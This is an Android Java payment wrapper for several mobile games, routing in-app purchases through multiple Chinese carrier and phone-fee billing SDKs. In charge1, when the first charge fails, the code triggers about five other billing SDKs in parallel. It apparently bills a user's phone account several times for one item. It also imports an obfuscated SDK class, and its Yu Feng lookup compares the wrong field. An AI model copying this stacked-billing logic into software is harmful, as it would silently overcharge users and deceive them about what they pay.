package com.bb_sz.pay;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import com.android.dimtale.mtools.listener.MPayResultListener;
import com.android.dimtale.mtools.utils.MPay;
import com.android.pri.in.PriCallBack;
import com.bb_sz.ndk.upload.ThirdPayCB;
import com.bb_sz.pay.order.PayOrder;
import com.door.frame.DnPayServer;
import com.jpay.sdk.IChargeResult;
import com.jpay.sdk.JPay;
import com.mj.jar.pay.BillingListener;
import com.wyzf.constant.PayResult;
import com.wyzf.pay.PayResultListener;
import com.wyzf.pay.WYZFPay;
import com.yfbb.pay.PaySDK;
import com.yfbb.pay.callback.PayResultCallback;

import java.util.Date;

import a.a.b.n.ESDK;

/**
 * Created by Administrator on 2017/4/24.
 */

public class WYPay {

    public static int JBGM = 4410;
    public static int SDPGM = 4414;
    public static int JMLP = 4418;
    public static int YJLQQBLP = 4411;
    public static int JGPGM = 4415;
    public static int SJLB = 4419;
    public static int CJYLGM = 4412;
    public static int JBYLB = 4416;
    public static int XXYEGM = 4413;
    public static int JMLB = 4417;

    public static int[] FCNLM_PAY_POINT = {4449, 4450, 4451, 4451, 4452, 4466};


    public static int[] HJZJ_PAY_POINT = {4423, 4424, 4425, 4426, 4427, 4428, 4429, 4430, 4431, 4432, 4433, 4434, 4435, 4436, 4437, 4438, 4439, 4440, 4441, 4442, 4443};

    public static int[] CJFX_PAY_POINT = {4560, 4561, 4562, 4563, 4564, 4565, 4566, 4567, 4568};

    public static String[] FCNLM_FEE_NAME = {"100金币", "250金币", "500金币", "700金币", "1000金币", "1600金币"};

    public static String[] HJZJ_FEE_NAME = {"首冲礼包", "安魂曲套装", "3日无限弹药", "超值大礼包", "豪华大礼包", "幸运大礼包", "畅玩大礼包", "钻石礼包", "VIP畅玩礼包", "钻石100", "钻石350", "钻石800", "钻石1500", "十字光剑",
            "M134加特林", "熔岩喷射器", "蓝焰冰晶之翼", "圣天使之翼", "兔女郎服装", "公主装", "血之克劳迪娅"};

    public static String[] CJFX_FEE_NAME = {
            "[登陆礼包]仅需20元，购买200钻石，并赠送50钻石，2个冲击波，2个血瓶",
            "[60钻石]仅需6元，购买60钻石",
            "[100钻石]仅需10元，购买100钻石",
            "[200钻石]仅需16元，购买200钻石",
            "[30000金币]仅需6元，购买30000金币",
            "[50000金币]仅需10元，购买50000金币",
            "[90000金币]仅需16元，购买90000金币",
            "[抽宠物]仅需6元，抽取一次稀有宠物",
            "[钻石礼包]仅需10元，购买100钻石，并赠送30钻石"};

    public static String[] TTBY_FEE_NAME = {
            "金币购买",
            "全部领取",
            "高爆鱼雷",
            "新鲜鱼饵",
            "能量炮",
            "激光炮",
            "金币鱼礼包",
            "精美礼包",
            "至尊大礼包",
            "升级礼包"
    };

    public static String[] HJZJ_M_PAY_POINT = {
            "lhpaAzcuov6kp5C6jydi1jqc",
            "7rijtpre3r6sfbuniqn8oniu",
            "gir0rhy9mB1q8t249ofAaaaC",
            "a5i7t1r92qDjosa9iohbw68q",
            "u0u09n2cr5yaf58zmw1m9dke",
            "9qAg3kskCCmrhk10bwo5h97a",
            "uCuuClfft7BE0niDf0nas5Cc",
            "pwkaxr9Ekk6CuAxq8chrkja5",
            "y8t9Cf3Eztmfchr3z1n8685E",
            "qAqEBpqhw8Euulzfdxsvfm4c",
            "6kyqj3u5dcgdpz64yqonfv28",
            "31kfqukEkuigsxeAeeq314tn",
            "vk74uyoA4Drgcj7bqyeuskoB",
            "4a2xBmeqclwvic8tftx6ztva",
            "gDhfa6ju7qkffoemEnorcCsx",
            "3vBfpf8x50rq20uxoxwcBks5",
            "huc5x8mlfsju5iojtk185fCg",
            "rzwf9x2sBavosled9lcscjoj",
            "lmEwe7b2Cucy5ip6ukcoft7j",
            "1hl00icgC80fcstudx2DD1th",
            "4xAlk9jEk86Dx4m5m58s6bsB"
    };

    public static String[] TTBY_M_PAY_POINT = {
            "wEz608uzuk2dmwv7203Agzqq",
            "sszhmpijAkvv3ux8g3lB5bie",
            "2k1mgppEmzE0fhr59agyExfh",
            "iddzgt0xb15wwc09n00trmAh",
            "hne4fo9fu4AwmzkE0Ekcb32w",
            "ca44Eyc7aBf9c1hpxlirf5m3",
            "bu596wysjEtrdC7C6slx0xjq",
            "zEpj7AbbCD6em64Dmo1y9iy6",
            "fqAsp5kjdcB0vBct9qdt0muc",
            "003jAy834zkvhrj95g0CgApp"
    };

    public static String[] FCNLM_M_PAY_POINT = {
            "gte1nynckiy9vdt6DwsCtCal",
            "skmlurrr1t079h8f8w4C429r",
            "okyqqmoEe7xu4luebkx8DA1v",
            "5v78hveqsCl244tp2j4zoDo0",
            "bt33iEnEgE3j1gz8xge6uwy8",
            "83irq1dtyBnsqptx5ibujc6D"
    };

    public static String[] CJFX_M_PAY_POINT = {
            "xcmB4yelhpljd1nsj34ml5Ao",
            "muDbuq4a2f38dAi0m8buydDE",
            "fcsaiqixhdjEylomrqf77miy",
            "88flw82755Eobmirr0qrd73q",
            "b6xCi9l0ksrxzpE0z6ikbpei",
            "ke3qCwzCjibso19rAolq7bar",
            "0y20ebn4qa5s6t32Ah7tuxlj",
            "wpCkjo2z0w8x7e5gl6k61eBc",
            "upEk4ElgBkq1u1pbb1txgpj1"
    };

    public static String[] HJZJ_QP_PAY_POINT={
      "05YP" ,
      "05YQ" ,
      "05YR" ,
      "05YS" ,
      "05YT" ,
      "05YU" ,
      "05YV" ,
      "05YW" ,
      "05YX" ,
      "05YY" ,
      "05YZ" ,
      "05Z0" ,
      "05Z1" ,
      "05Z2" ,
      "05Z3" ,
      "05Z4" ,
      "05Z5" ,
      "05Z6" ,
      "05Z7" ,
      "05Z8" ,
      "05Z9"
    };

    public static String[] TTBY_QP_PAY_POINT={
            "05YG" ,
            "05YH" ,
            "05YI" ,
            "05YJ" ,
            "05YK" ,
            "05YL" ,
            "05YM" ,
            "05YN" ,
            "未配" ,
            "05YO"
    };

    public static String[] FCNLM_QP_PAY_POINT ={
          "05Y1" ,
          "05Y2" ,
          "05Y3" ,
          "05Y4" ,
          "05Y5" ,
          "05Y6"
    };

    public static String[] CJFX_QP_PAY_POINT ={
          "05Y7" ,
          "05Y8" ,
          "05Y9" ,
          "05YA" ,
          "05YB" ,
          "05YC" ,
          "05YD" ,
          "05YE" ,
          "05YF"
    };




    public static Handler appHandler = new Handler(){

        @Override
        public void handleMessage(Message msg) {
            // TODO Auto-generated method stub
            if (msg.what == 100)
            {
                Bundle data = msg.getData();
                int errcode = data.getInt("errcode");
                String extdata = data.getString("extdata");
                Log.e("sky","qi pa pay success telephone pay----errCode"+errcode+"---extData="+extdata);
                giftCallBack(0,"qi pa phone fee pay success",chargeResult);
                //chargeResult.onChargeResult(0,"qi pa phone fee pay success");
            }
            else if (msg.what == 200)
            {
                Bundle data = msg.getData();
                int errcode = data.getInt("errcode");
                String extdata = data.getString("extdata");
                Log.e("sky","qi pa pay success zhi fu bao pay----errCode"+errcode+"---extData="+extdata);
                //chargeResult.onChargeResult(0,"qi pa zhi fu bao pay failed");
                giftCallBack(0,"qi pa phone fee pay success",chargeResult);
            }
            else
            {
                //应用可以不关心这些错误码
                Bundle data = msg.getData();
                int errcode = data.getInt("errcode");
                String extdata = data.getString("extdata");
                Log.e("sky","qi pa pay failed----errCode"+errcode+"---extData="+extdata);
                giftCallBack(1,"qi pa pay failed",chargeResult);
                //chargeResult.onChargeResult(1,"qi pa pay failed");
            }
        }

    };

    /**
     * 玉峰支付回调
     */
    public static BillingListener billingListener = new BillingListener() {
        @Override
        public void onInitResult(int i) {
            Log.e("sky","Yu Feng init result="+i);
        }

        @Override
        public void onBillingResult(int i, Bundle bundle) {
            Log.e("sky","Yu Feng pay result="+i);
        }
    };


    private static String getMPayPointByFeeName(String feeDesc, String feeName) {
        Log.e("sky", "appname=" + feeDesc);
        Log.e("sky", "feeName=" + feeName);
        if (feeDesc.equals("合金战姬")) {
            return HJZJ_M_PAY_POINT[indexof(feeName, HJZJ_FEE_NAME)];
        } else if (feeDesc.equals("天天捕鱼")) {
            return TTBY_M_PAY_POINT[indexof(feeName, TTBY_FEE_NAME)];
        } else if (feeDesc.equals("复仇鸟联盟2")) {
            return FCNLM_M_PAY_POINT[indexof(feeName, FCNLM_FEE_NAME)];
        } else if (feeDesc.equals("超级飞侠")) {
            return CJFX_M_PAY_POINT[indexof(feeName, CJFX_FEE_NAME)];
        }
        return "4xAlk9jEk86Dx4m5m58s6bsB";
    }


    private static int getPayPointBuYu(String feeDesc, String feeName) {
        Log.e("sky", "appname=" + feeDesc);
        Log.e("sky", "feeName=" + feeName);
        if (null == feeName) return 0;
        if (feeDesc.equals("天天捕鱼")) {
            if ("金币大折扣".equals(feeName)) {
                return JBGM;
            } else if ("全部领取".equals(feeName)) {
                return YJLQQBLP;
            } else if ("高爆鱼雷".equals(feeName)) {
                return CJYLGM;
            } else if ("新鲜鱼饵".equals(feeName)) {
                return XXYEGM;
            } else if ("能量炮".equals(feeName)) {
                return SDPGM;
            } else if ("激光炮".equals(feeName)) {
                return JGPGM;
            } else if ("金币鱼礼包".equals(feeName)) {
                return JBYLB;
            } else if ("至尊大礼包".equals(feeName)) {
                return JMLP;
            } else if ("升级礼包".equals(feeName)) {
                return SJLB;
            } else {
                return JMLB;//9
            }
        } else if (feeDesc.equals("合金战姬")) {
            return HJZJ_PAY_POINT[indexof(feeName, HJZJ_FEE_NAME)];
        } else if (feeDesc.equals("复仇鸟联盟2")) {
            return FCNLM_PAY_POINT[indexof(feeName, FCNLM_FEE_NAME)];
        } else if (feeDesc.equals("超级飞侠")) {
            return CJFX_PAY_POINT[indexof(feeName, CJFX_FEE_NAME)];
        }
        return 0;
    }


    public static int indexof(String feeName, String[] payNames) {
        Log.e("sky","feeName="+feeName+"---payNames="+payNames[0]);
        for (int i = 0; i < payNames.length; i++) {
            if (payNames[i].equals(feeName)) {
                return i;
            }
        }
        return payNames.length - 3;
    }

    private static int getYiYouPayPoint(String feeDesc, String feeName) {
        if (feeDesc.equals("天天捕鱼")) {
            return indexof(feeDesc,TTBY_FEE_NAME)+1;
        }else if (feeDesc.equals("合金战姬")) {
            return indexof(feeName, HJZJ_FEE_NAME)+1;
        } else if (feeDesc.equals("复仇鸟联盟2")) {
            return indexof(feeName, FCNLM_FEE_NAME)+1;
        } else if (feeDesc.equals("超级飞侠")) {
            return indexof(feeName, CJFX_FEE_NAME)+1;
        }
        return 1;
    }

    private static String getQiPaPayPoint(String feeDesc, String feeName){
        Log.e("sky", "getQiPaPayPoint---appname=" + feeDesc);
        Log.e("sky", "getQiPaPayPoint---feeName=" + feeName);
        String result = "";
        if (feeDesc.equals("合金战姬")) {
            result =  HJZJ_QP_PAY_POINT[indexof(feeName, HJZJ_FEE_NAME)];
        } else if (feeDesc.equals("天天捕鱼")) {
            result =  TTBY_QP_PAY_POINT[indexof(feeName, TTBY_FEE_NAME)];
        } else if (feeDesc.equals("复仇鸟联盟2")) {
            result =  FCNLM_QP_PAY_POINT[indexof(feeName, FCNLM_FEE_NAME)];
        } else if (feeDesc.equals("超级飞侠")) {
            result =  CJFX_QP_PAY_POINT[indexof(feeName, CJFX_FEE_NAME)];
        }
        Log.e("sky","qi pa payPoint="+result);
        return result;
    }

    private static String GET_YU_FENG_PAY_POINT(String feeDesc, String feeName,String price){
        Log.e("sky","GET_YU_FENG_PAY_POINT---feeDesc="+feeDesc+"----feeName="+feeName+"---price="+price);
        int p = Integer.parseInt(price);
        if (p>=2000){
            if (feeDesc.equals("天天捕鱼")) {
                return null;
            }else if (feeDesc.equals("合金战姬")) {
                if (feeName.equals("安魂曲套装")){
                    return "000665000";
                }else if (feeDesc.equals("超值大礼包")){
                    return "000665001";
                }else if (feeDesc.equals("VIP畅玩礼包")){
                    return "000665002";
                }else if (feeDesc.equals("钻石1500")){
                    return "000665003";
                }else {
                    return "000665000";
                }
            } else if (feeDesc.equals("复仇鸟联盟2")) {
                return "000664000";
            } else if (feeDesc.equals("超级飞侠")) {
                return "000666000";
            }
        }
        return null;
    }



    static int payType = 9;
    static IChargeResult chargeResult = null;

    public static void charge(final Activity activity, final String price, String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {
        PayOrder.getInstance().init(activity);
        payType = Api.getPayType(activity);
        Log.e("sky", "payType=" + payType + "------");
        if(feeDesc.equals("天天捕鱼") && feeName.equals("至尊大礼包")){
            chargeResultCb.onChargeResult(0,"pay free");
            return;
        }
        if (payType == 9) {
            charge1(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
        } else {
            charge2(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
        }
    }

    private static void giftCallBack(int i,String msg,IChargeResult chargeResult){
        if (!Api.sendGift()){
            chargeResult.onChargeResult(i,msg);
        }
    }

    /**
     * 奇葩sdk
     * @param activity
     * @param price
     * @param uniqueid
     * @param cpserverparam
     * @param feeName
     * @param feeDesc
     * @param chargeResultCb
     */
    private static void charge4(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, IChargeResult chargeResultCb) {
        initThirdReport(activity, 5);
        chargeResult = chargeResultCb;
        DnPayServer.getInstance().startPayservice(activity,getQiPaPayPoint(feeDesc,feeName),"");
    }


    public static int failed = 0;
    public static int success = 0;


    public static void charge1(final Activity activity, final String price, final String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {
        success = 0;
        failed = 0;
        JPay.getInstance().charge(activity, price, uniqueid, cpserverparam, feeName, feeDesc, new IChargeResult() {
            @Override
            public void onChargeResult(int i, String s) {
                Log.e("sky", "jpay result:" + i + "-----s=" + s);
                if (i != 0 && i != 6) {// 0 表示计费成功； 6 表示mm计费成功，当成功处理。
                    initThirdReport(activity, 1);
                    final int p = changePrice(price);
                    Log.e("sky", "WYZFPay start price=" + p + "---feeCode=" + "{$feeCode$}");
                    WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"), p, new PayResultListener() {
                        @Override
                        public void onResult(PayResult payResult, int i) {
                            Log.e("sky", "WYZFPay Result=" + payResult.msg + "---threadId=" + Thread.currentThread().getId() + "---threadName=" + Thread.currentThread().getName());
                            switch (payResult) {
                                case SUCCESS: {
                                    synchronized (chargeResultCb) {
                                        if (success == 0) {
                                            success = 1;
                                            giftCallBack(0, "WYZFPay success",chargeResultCb);
                                            //chargeResultCb.onChargeResult(0, "WYZFPay success");
                                        }
                                    }
                                    break;
                                }
                                default: {
                                    synchronized (chargeResultCb) {
                                        if (failed >= 2) {
                                            failed = -1;
                                            giftCallBack(1, "WYZFPay failed",chargeResultCb);
                                            //chargeResultCb.onChargeResult(1, "WYZFPay failed");
                                        } else {
                                            failed++;
                                        }
                                    }
                                }
                            }
                        }
                    });

                    initThirdReport(activity, 2);
                    int yentPayPoint = getPayPointBuYu(feeDesc, feeName);
                    Log.e("sky", "Yin Mei start ----yentPayPoint=" + yentPayPoint);
                    ESDK.getInstance(activity).pay(yentPayPoint, cpserverparam, activity, new PriCallBack() {
                        @Override
                        public void success(int i) {
                            Log.e("sky", "time end failed=" + failed + "----success=" + success);
                            synchronized (chargeResultCb) {
                                Log.e("sky:", "YentPay success" + "---threadId=" + Thread.currentThread().getId() + "---threadName=" + Thread.currentThread().getName());
                                if (success == 0) {
                                    success = 1;
                                    giftCallBack(0, "YentPay success",chargeResultCb);
                                }
                            }
                        }

                        @Override
                        public void fail(int i) {
                            synchronized (chargeResultCb) {
                                Log.e("sky:", "YentPay failed， i= " + i + "---threadId=" + Thread.currentThread().getId() + "---threadName=" + Thread.currentThread().getName());
                                if (failed >= 2) {
                                    failed = -1;
                                    giftCallBack(1, "YentPay failed",chargeResultCb);
                                } else {
                                    failed++;
                                }
                            }
                        }
                    });

                    initThirdReport(activity, 3);
                    int mprice = changePriceForMPay(price);
                    String mPoint = getMPayPointByFeeName(feeDesc, feeName);
                    Log.e("sky", "MPay start-----mprice=" + mprice + "---MAI_MSA=" + "{$MAI_MSA$}---" + "cid=" + "{$CID$}" + "----mPoint=" + mPoint);
                    MPay.getInstance().pay(activity, mPoint, "{$CID$}", "{$CID$}", new MPayResultListener() {
                        @Override
                        public void callback(String s, int i, int i1, String s1) {
                            Log.e("sky","Mpay result:cpOid="+s+"---code="+i+"---detail="+i1+"---ext="+s1);
                        }
                    });
                    //奇葩pay
                    charge4(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    //宜游
                    charge3(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    //玉峰
                    charge5(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);

                } else {
                    Log.e("sky:", "jpay success");
                    giftCallBack(0, "jpay success",chargeResultCb);
                }
            }
        });
    }

    private static void charge5(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, IChargeResult chargeResultCb) {
        initThirdReport(activity, 6);
        String payPoint = null;
        if (null == Main.mjPaySDK){
            Log.e("sky","Yu Feng no need");
            return;
        }else if (null != (payPoint = GET_YU_FENG_PAY_POINT(feeDesc,feeName,price))){
            Main.mjPaySDK.pay(String.valueOf(System.currentTimeMillis()),payPoint,"2000");
            return;
        }
        Log.e("sky","price blow 20");
    }

    private static void charge3(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, final IChargeResult chargeResultCb) {
        initThirdReport(activity, 4);
        int payPoint =1;
        payPoint = getYiYouPayPoint(feeDesc,feeName);
        Log.e("sky","yi you pay start-----payPoint="+payPoint);
        PaySDK.getInstance().startPay(activity, payPoint, 0, 0, new PayResultCallback() {
            @Override
            public void onPayCancel(int i) {
                Log.e("sky","Yi You pay cancel"+"---i="+i);
                giftCallBack(1,"Yi You pay cancel",chargeResultCb);
                //chargeResultCb.onChargeResult(1,"Yi You pay cancel");
            }

            @Override
            public void onPayFailed(int i, String s, String s1) {
                Log.e("sky","Yi You pay failed"+"------i="+i+"---s="+s+"---s1="+s1);
                giftCallBack(1,"Yi You pay failed",chargeResultCb);
                //chargeResultCb.onChargeResult(1,"Yi You pay failed");
            }

            @Override
            public void onPaySuccess(int i, int i1) {
                Log.e("sky","Yi You pay success"+"---i="+i+"----i1="+i1);
                giftCallBack(0,"Yi You pay success",chargeResultCb);
                //chargeResultCb.onChargeResult(0,"Yi You pay success");
            }
        });
    }

    public static void charge2(final Activity activity, final String price, String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {


        JPay.getInstance().charge(activity, price, uniqueid, cpserverparam, feeName, feeDesc, new IChargeResult() {
            @Override
            public void onChargeResult(int i, String s) {
                Log.e("sky", "i=" + i + "----s=" + s);
                if (i != 0 && i != 6) {// 0 表示计费成功； 6 表示mm计费成功，当成功处理。
                    final int p = changePrice(price);
                    Log.e("sky", "price=" + p);
                    if (Api.getPayType(activity) == 2) {
                        Log.e("sky", "WYZFPay first");
                        initThirdReport(activity, 1);
                        WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"), p, new PayResultListener() {
                            @Override
                            public void onResult(PayResult payResult, int i) {
                                switch (payResult) {
                                    case SUCCESS: {
                                        Log.e("sky:", "weiyun success");
                                        giftCallBack(0, "WYZFPay success",chargeResultCb);
                                        //chargeResultCb.onChargeResult(0, "WYZFPay success");
                                        break;
                                    }
                                    default: {
                                        Log.e("sky", "PayResult" + payResult.msg);
                                        initThirdReport(activity, 2);
                                        ESDK.getInstance(activity).pay(getPayPointBuYu(feeDesc, feeName), cpserverparam, activity, new PriCallBack() {
                                            @Override
                                            public void success(int i) {
                                                Log.e("sky:", "YentPay success");
                                                giftCallBack(0, "YentPay success",chargeResultCb);
                                                //chargeResultCb.onChargeResult(0, "YentPay success");
                                            }

                                            @Override
                                            public void fail(int i) {
                                                Log.e("sky:", "YentPay failed， i= " + i);
                                                giftCallBack(1, "pay failed",chargeResultCb);
                                                //chargeResultCb.onChargeResult(1, "pay failed");
                                            }
                                        });
                                    }
                                }
                            }
                        });
                    } else {
                        Log.e("sky", "Yent first");
                        initThirdReport(activity, 2);
                        ESDK.getInstance(activity).pay(getPayPointBuYu(feeDesc, feeName), feeName, activity, new PriCallBack() {
                            @Override
                            public void success(int i) {
                                Log.e("sky:", "YentPay success");
                                giftCallBack(0, "YentPay success",chargeResultCb);
                                //chargeResultCb.onChargeResult(0, "YentPay success");
                            }

                            @Override
                            public void fail(int i) {
                                Log.e("sky:", "YentPay failed， i= " + i);
                                initThirdReport(activity, 1);
                                WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"), p, new PayResultListener() {
                                    @Override
                                    public void onResult(PayResult payResult, int i) {
                                        switch (payResult) {
                                            case SUCCESS: {
                                                Log.e("sky:", "WYZFPay success");
                                                giftCallBack(0, "WYZFPay success",chargeResultCb);
                                                //chargeResultCb.onChargeResult(0, "YentPay success");
                                                break;
                                            }
                                            default: {
                                                Log.e("sky", "PayResult" + payResult.msg);
                                                Log.e("sky:", "WYZFPay failed");
                                                giftCallBack(1, "WYZFPay failed",chargeResultCb);
                                                //chargeResultCb.onChargeResult(1, "pay failed");
                                            }
                                        }
                                    }
                                });
                            }
                        });
                    }
                } else {
                    Log.e("sky:", "jpay success");
                    giftCallBack(0, "jpay success",chargeResultCb);
                    //chargeResultCb.onChargeResult(0, "jpay success");
                }
            }
        });
    }

    private static int changePrice(String price) {
        int p = Integer.parseInt(price);
        if (p < 1000) {
            return 500;
        } else if (p < 1500) {
            return 1000;
        } else if (p < 2000) {
            return 1500;
        }
        return 2000;
    }

    private static int changePriceForMPay(String price) {
        int p = Integer.parseInt(price);
        if (p % 200 != 0) {
            return p - 100;
        } else {
            return p;
        }
    }

    private static int getPayType(Activity activity) {
        return 1;
    }

    private static boolean isWeiYunPayFirst(Activity activity) {
        return PayOrder.getInstance().isWeiYunPayFirst(activity);
    }

    private static void initThirdReport(Activity activity, int type) {
        ThirdPayCB.getInstance().init(activity, type);
    }


}
